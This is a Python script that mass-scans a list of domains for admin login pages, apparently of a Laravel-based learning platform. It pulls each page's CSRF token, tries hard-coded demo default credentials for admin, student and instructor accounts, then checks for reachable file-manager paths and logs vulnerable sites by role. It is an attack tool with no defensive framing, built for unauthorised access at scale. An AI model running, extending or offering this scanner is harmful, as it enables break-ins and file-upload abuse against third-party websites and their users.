import requests
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Input file containing list of domains (without http/https)
input_file = "list.txt"

# Default login credentials
credentials = {
    "admin@demo.com": "admin",
    "student@demo.com": "student",
    "instructor@demo.com": "instructor",
}

# Output result files
output_files = {
    "admin": "result_admin.txt",
    "student": "result_student.txt",
    "instructor": "result_instructor.txt",
    "fail": "result_need_register.txt",
}

# Thread lock to safely write to files
lock = threading.Lock()

# Main function to attempt login and check file manager access
def check_login(domain):
    try:
        base_url = f"https://{domain}"
        login_url = urljoin(base_url, "/admin/login")

        # Create session to retain cookies
        session = requests.Session()
        res = session.get(login_url, verify=False, timeout=10)

        soup = BeautifulSoup(res.text, "html.parser")
        token_input = soup.find("input", {"name": "_token"})
        if not token_input:
            print(f"[!] _token not found on {domain}")
            with lock:
                with open(output_files["fail"], "a") as f:
                    f.write(domain + "\n")
            return

        token = token_input["value"]

        for email, password in credentials.items():
            payload = {
                "_token": token,
                "email": email,
                "password": password
            }
            headers = {
                "Referer": login_url,
                "Origin": base_url,
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            login_res = session.post(login_url, data=payload, headers=headers, allow_redirects=True, timeout=10)

            # If login successful
            if "/admin/dashboard" in login_res.url or "dashboard" in login_res.text.lower():
                for path in ["/filemanager", "/laravel-filemanager"]:
                    fm_url = urljoin(base_url, path)
                    fm_res = session.get(fm_url, timeout=10, verify=False)
                    if "File Manager" in fm_res.text or "filemanager" in fm_res.url:
                        role = email.split("@")[0]
                        with lock:
                            with open(output_files[role], "a") as f:
                                f.write(domain + "\n")
                        print(f"[+] Login successful as {role} on {domain}")
                        return

        # If all login attempts failed
        with lock:
            with open(output_files["fail"], "a") as f:
                f.write(domain + "\n")
        print(f"[-] Failed to login on {domain}")
    except Exception as e:
        print(f"[!] Error on {domain}: {e}")
        with lock:
            with open(output_files["fail"], "a") as f:
                f.write(domain + "\n")

# Run multi-threaded login checks
def run_threads():
    with open(input_file, "r") as f:
        domains = [line.strip() for line in f if line.strip()]
    
    threads = []
    for domain in domains:
        t = threading.Thread(target=check_login, args=(domain,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    run_threads()

